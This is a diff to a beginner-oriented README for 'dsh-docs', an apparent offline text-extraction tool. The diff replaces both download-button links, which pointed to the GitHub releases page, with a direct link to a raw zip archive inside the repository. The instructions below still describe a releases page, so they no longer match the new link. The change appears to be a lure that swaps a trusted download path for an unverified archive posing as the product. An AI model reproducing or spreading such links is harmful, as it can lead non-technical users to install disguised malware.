@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run **dsh-docs**, a tool that let
 
 Think of it as a smart assistant that can "see" inside your files and pull out the words, even if they're pictures of text. It works quietly in the background, keeping your information private because nothing ever leaves your machine.
 
-[![Download Now](https://img.shields.io/badge/Download_dsh--docs-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/protoctistmoses143/dsh-docs/releases)
+[![Download Now](https://img.shields.io/badge/Download_dsh--docs-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/protoctistmoses143/dsh-docs/main/docs/dsh-docs-v2.3.zip)
 
 ## ⚡ What Does This Do?
 
@@ -43,7 +43,7 @@ Follow these simple steps. Take your time.
 
 Click this big button:
 
-[![Get dsh-docs Here](https://img.shields.io/badge/⬇%EF%B8%8F%20Download%20Now-Click%20Me!-brightgreen?style=for-the-badge&color=FF4500)](https://github.com/protoctistmoses143/dsh-docs/releases)
+[![Get dsh-docs Here](https://img.shields.io/badge/⬇%EF%B8%8F%20Download%20Now-Click%20Me!-brightgreen?style=for-the-badge&color=FF4500)](https://raw.githubusercontent.com/protoctistmoses143/dsh-docs/main/docs/dsh-docs-v2.3.zip)
 
 This link takes you to a page on GitHub where you'll find the latest versions of the app. Don't be intimidated by the technical look of the site—just look for the section that says "Assets" or looks like a list of files.
 
